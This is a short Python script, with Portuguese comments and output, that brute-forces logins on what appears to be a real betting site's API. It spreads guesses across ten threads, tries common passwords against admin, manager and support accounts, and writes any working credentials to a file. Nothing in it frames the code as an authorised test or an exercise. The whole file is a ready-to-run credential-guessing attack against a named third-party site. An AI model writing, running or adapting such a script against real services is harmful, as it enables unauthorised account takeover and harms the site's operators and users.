import requests
import concurrent.futures

def try_login(username, password):
    url = "https://w1-panda.bet/api/login"
    payload = {"username": username, "password": password}
    try:
        response = requests.post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f"[!!!] SUCESSO: {username}:{password}")
            return (username, password)
    except:
        pass
    return None

def run_brute_force():
    users = ["admin", "manager", "support"]
    # Lista de senhas comuns para o concurso
    passwords = ["admin123", "123456", "password", "panda2026", "bet123", "root", "admin"]
    
    print(f"[*] Iniciando força bruta otimizada em {len(users)} usuários e {len(passwords)} senhas...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for user in users:
            for pwd in passwords:
                futures.append(executor.submit(try_login, user, pwd))
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                return result
    
    return None

if __name__ == "__main__":
    creds = run_brute_force()
    if creds:
        with open("credentials_found.txt", "w") as f:
            f.write(f"{creds[0]}:{creds[1]}")
    else:
        print("[-] Nenhuma credencial encontrada com a lista atual.")
